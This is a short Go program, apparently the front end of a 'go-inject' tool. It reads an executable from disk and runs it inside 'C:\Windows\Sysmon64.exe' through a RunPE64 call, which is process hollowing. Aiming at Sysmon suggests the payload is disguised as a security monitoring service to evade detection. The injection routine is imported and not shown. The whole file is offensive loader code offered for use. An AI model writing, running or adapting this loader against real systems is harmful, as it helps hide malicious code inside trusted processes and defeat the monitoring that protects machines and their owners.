package main

import (
	"flag"
	"go-inject/inject"
	"io/ioutil"
)

func main() {

	var src, dest string
	flag.StringVar(&src, "src", "test.exe", "Source executable")
	flag.StringVar(&dest, "dest", "C:\\Windows\\Sysmon64.exe", "Destination executable")
	flag.Parse()
	data, _ := ioutil.ReadFile(src)
	inject.RunPE64(data, dest, "")
}
